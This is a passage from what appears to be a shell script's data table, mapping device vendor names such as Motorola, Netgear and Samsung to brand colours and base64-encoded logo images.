YxLjJoMC4ydi0wLjlsMC40IDAuOGgwLjFsMC40LTAuOHYwLjhoMC4ydi0xLjF6Ii8+Cgo8L3N2Zz4K'
										["Mitrastar"]='#70A0D4 #E3E6E5 #B2B2B2 data:image/png;base64,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'
										["Motorola"]='#0033FF #000106 #CCCCCC data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+CjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNC4wLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDQzMzYzKSAgLS0+Cgo8c3ZnCiAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIKICAgeG1sbnM6Y2M9Imh0dHA6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL25zIyIKICAgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIgogICB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIgogICB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciCiAgIHhtbG5zOnNvZGlwb2RpPSJodHRwOi8vc29kaXBvZGkuc291cmNlZm9yZ2UubmV0L0RURC9zb2RpcG9kaS0wLmR0ZCIKICAgeG1sbnM6aW5rc2NhcGU9Imh0dHA6Ly93d3cuaW5rc2NhcGUub3JnL25hbWVzcGFjZXMvaW5rc2NhcGUiCiAgIHZlcnNpb249IjEuMSIKICAgaWQ9IkxheWVyXzEiCiAgIHg9IjBweCIKICAgeT0iMHB4IgogICB3aWR0aD0iNDQuOTU0OTk4IgogICBoZWlnaHQ9IjQ0Ljk1NDk5OCIKICAgdmlld0JveD0iMCAwIDQ0Ljk1NDk5OCA0NC45NTQ5OTgiCiAgIHhtbDpzcGFjZT0icHJlc2VydmUiCiAgIGlua3NjYXBlOnZlcnNpb249IjAuNDguMiByOTgxOSIKICAgc29kaXBvZGk6ZG9jbmFtZT0iTSBCTFVFLnN2ZyI+PG1ldGFkYXRhCiAgIGlkPSJtZXRhZGF0YTI5Ij48cmRmOlJERj48Y2M6V29yawogICAgICAgcmRmOmFib3V0PSIiPjxkYzpmb3JtYXQ+aW1hZ2Uvc3ZnK3htbDwvZGM6Zm9ybWF0PjxkYzp0eXBlCiAgICAgICAgIHJkZjpyZXNvdXJjZT0iaHR0cDovL3B1cmwub3JnL2RjL2RjbWl0eXBlL1N0aWxsSW1hZ2UiIC8+PGRjOnRpdGxlPjwvZGM6dGl0bGU+PC9jYzpXb3JrPjwvcmRmOlJERj48L21ldGFkYXRhPjxkZWZzCiAgIGlkPSJkZWZzMjciPjxpbmtzY2FwZTpwZXJzcGVjdGl2ZQogICBzb2RpcG9kaTp0eXBlPSJpbmtzY2FwZTpwZXJzcDNkIgogICBpbmtzY2FwZTp2cF94PSIwIDogMjcgOiAxIgogICBpbmtzY2FwZTp2cF95PSIwIDogMTAwMCA6IDAiCiAgIGlua3NjYXBlOnZwX3o9IjI1MCA6IDI3IDogMSIKICAgaW5rc2NhcGU6cGVyc3AzZC1vcmlnaW49IjEyNSA6IDE4IDogMSIKICAgaWQ9InBlcnNwZWN0aXZlMzEiIC8+CgkKCQoJCgkKCQoJCgkKCQoJCgkKPC9kZWZzPjxzb2RpcG9kaTpuYW1lZHZpZXcKICAgcGFnZWNvbG9yPSIjZmZmZmZmIgogICBib3JkZXJjb2xvcj0iIzY2NjY2NiIKICAgYm9yZGVyb3BhY2l0eT0iMSIKICAgb2JqZWN0dG9sZXJhbmNlPSIxMCIKICAgZ3JpZHRvbGVyYW5jZT0iMTAiCiAgIGd1aWRldG9sZXJhbmNlPSIxMCIKICAgaW5rc2NhcGU6cGFnZW9wYWNpdHk9IjAiCiAgIGlua3NjYXBlOnBhZ2VzaGFkb3c9IjIiCiAgIGlua3NjYXBlOndpbmRvdy13aWR0aD0iMTYwMCIKICAgaW5rc2NhcGU6d2luZG93LWhlaWdodD0iODM3IgogICBpZD0ibmFtZWR2aWV3MjUiCiAgIHNob3dncmlkPSJmYWxzZSIKICAgaW5rc2NhcGU6em9vbT0iMi4xNiIKICAgaW5rc2NhcGU6Y3g9IjEyMCIKICAgaW5rc2NhcGU6Y3k9IjIyLjQ3Njk5OCIKICAgaW5rc2NhcGU6d2luZG93LXg9Ii04IgogICBpbmtzY2FwZTp3aW5kb3cteT0iLTgiCiAgIGlua3NjYXBlOndpbmRvdy1tYXhpbWl6ZWQ9IjEiCiAgIGlua3NjYXBlOmN1cnJlbnQtbGF5ZXI9IkxheWVyXzEiCiAgIGZpdC1tYXJnaW4tdG9wPSIwIgogICBmaXQtbWFyZ2luLWxlZnQ9IjAiCiAgIGZpdC1tYXJnaW4tcmlnaHQ9IjAiCiAgIGZpdC1tYXJnaW4tYm90dG9tPSIwIiAvPgo8cGF0aAogICBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIgogICBpZD0icGF0aDUiCiAgIGQ9Im0gNDEuOTQ5LDIyLjgyNCBjIDAsMTAuNzQyIC04LjcxLDE5LjQ1MyAtMTkuNDU0LDE5LjQ1MyBDIDExLjc1MSw0Mi4yNzcgMy4wNDE5OTk1LDMzLjU2NiAzLjA0MTk5OTUsMjIuODI0IDMuMDQxOTk5NSwxMi4wNzggMTEuNzUxLDMuMzcgMjIuNDk1LDMuMzcgYyAxMC43NDQsMCAxOS40NTQsOC43MDggMTkuNDU0LDE5LjQ1NCIKICAgc3R5bGU9ImZpbGw6I2ZmZmZmZiIgLz48cGF0aAogICBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIgogICBpZD0icGF0aDciCiAgIGQ9Im0gMjIuNDc0LDAgYyAxMi41NzksMCAyMi40ODEsMTAuMTM0IDIyLjQ4MSwyMi40NzcgMCwxMi40MTYgLTEwLjA2NywyMi40NzggLTIyLjQ4MSwyMi40NzggQyAxMC4wNjIsNDQuOTU2IC00LjUwOTcxNzllLTcsMzQuODkzIC00LjUwOTcxNzllLTcsMjIuNDc4IC00LjUwOTcxNzllLTcsMTAuMDYxIDEwLjA2MiwwIDIyLjQ3NCwwIE0gMjIuNDI0LDI3LjE5MSAxNi4xMzcsNi4zMjkgNy45OTU5OTk1LDMzLjAzOSBoIDEuNTI3IGMgMCwwIDEuMDI3MDAwNSwtNC42NDYgMi42OTcwMDA1LC03LjQyMSAwLjkwOSwtMS41MDcgMi4zMSwtMi43MzkgNC4xODMsLTIuNzA1IDEuMzE5LDAuMDI2IDIuNDYyLDAuNzQ3IDMuODg5LDIuNzQzIDAuODU4LDEuMTk1IDIuMTc5LDQuMjQ0IDIuMTc5LDQuMjQ0IDAsMCAxLjMyMiwtMy4wNDUgMi4xODMsLTQuMjQ0IDEuNDIzLC0xLjk5NiAyLjU2NiwtMi43MTcgMy44ODksLTIuNzQzIDEuODcxLC0wLjAzNCAzLjI3NSwxLjE5OCA0LjE4LDIuNzA4IDEuNjcxLDIuNzcxIDIuNjk3LDcuNDE4IDIuNjk3LDcuNDE4IGggMS41MzEgbCAtOC4xNDYsLTI2LjcxIC02LjI4NiwyMC44NjIgLTAuMDQ1LDAuMDM3IC0wLjA1LC0wLjAzNyB6IgogICBzdHlsZT0iZmlsbDojMDAwMDAwIiAvPgo8L3N2Zz4='
										["Netgear"]='#D9D9D9 #330099 #D6D6D6 data:image/png;base64,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'
										["Samsung"]='#C3D1DC #1428A0 #A6A6A6 data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+CjwhLS0gQ3JlYXRlZCB3aXRoIElua3NjYXBlIChodHRwOi8vd3d3Lmlua3NjYXBlLm9yZy8pIC0tPgoKPHN2ZwogICB2ZXJzaW9uPSIxLjEiCiAgIGlkPSJzdmcyIgogICB4bWw6c3BhY2U9InByZXNlcnZlIgogICB3aWR0aD0iNzA1MS40MDIzIgogICBoZWlnaHQ9IjEwODAiCiAgIHZpZXdCb3g9IjAgMCA3MDUxLjQwMjQgMTA4MCIKICAgc29kaXBvZGk6ZG9jbmFtZT0iU2Ftc3VuZ193b3JkbWFyay5zdmciCiAgIGlua3NjYXBlOnZlcnNpb249IjEuMSAoYzY4ZTIyYzM4NywgMjAyMS0wNS0yMykiCiAgIHhtbG5zOmlua3NjYXBlPSJodHRwOi8vd3d3Lmlua3NjYXBlLm9yZy9uYW1lc3BhY2VzL2lua3NjYXBlIgogICB4bWxuczpzb2RpcG9kaT0iaHR0cDovL3NvZGlwb2RpLnNvdXJjZWZvcmdlLm5ldC9EVEQvc29kaXBvZGktMC5kdGQiCiAgIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIKICAgeG1sbnM6c3ZnPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHNvZGlwb2RpOm5hbWVkdmlldwogICAgIGlkPSJuYW1lZHZpZXcxMSIKICAgICBwYWdlY29sb3I9IiNmZmZmZmYiCiAgICAgYm9yZGVyY29sb3I9IiM2NjY2NjYiCiAgICAgYm9yZGVyb3BhY2l0eT0iMS4wIgogICAgIGlua3NjYXBlOnBhZ2VzaGFkb3c9IjIiCiAgICAgaW5rc2NhcGU6cGFnZW9wYWNpdHk9IjAuMCIKICAgICBpbmtzY2FwZTpwYWdlY2hlY2tlcmJvYXJkPSIwIgogICAgIHNob3dncmlkPSJmYWxzZSIKICAgICBmaXQtbWFyZ2luLXRvcD0iMCIKICAgICBmaXQtbWFyZ2luLWxlZnQ9IjAiCiAgICAgZml0LW1hcmdpbi1yaWdodD0iMCIKICAgICBmaXQtbWFyZ2luLWJvdHRvbT0iMCIKICAgICBpbmtzY2FwZTp6b29tPSIwLjA1OTgyOTQ2NSIKICAgICBpbmtzY2FwZTpjeD0iMjg0OS43NjY0IgogICAgIGlua3NjYXBlOmN5PSIxNDI5LjA2MTciCiAgICAgaW5rc2NhcGU6d2luZG93LXdpZHRoPSIxOTIwIgogICAgIGlua3NjYXBlOndpbmRvdy1oZWlnaHQ9IjEwMTciCiAgICAgaW5rc2NhcGU6d2luZG93LXg9IjE5MTIiCiAgICAgaW5rc2NhcGU6d2luZG93LXk9Ii04IgogICAgIGlua3NjYXBlOndpbmRvdy1tYXhpbWl6ZWQ9IjEiCiAgICAgaW5rc2NhcGU6Y3VycmVudC1sYXllcj0ic3ZnMiIgLz48ZGVmcwogICAgIGlkPSJkZWZzNiI+PGNsaXBQYXRoC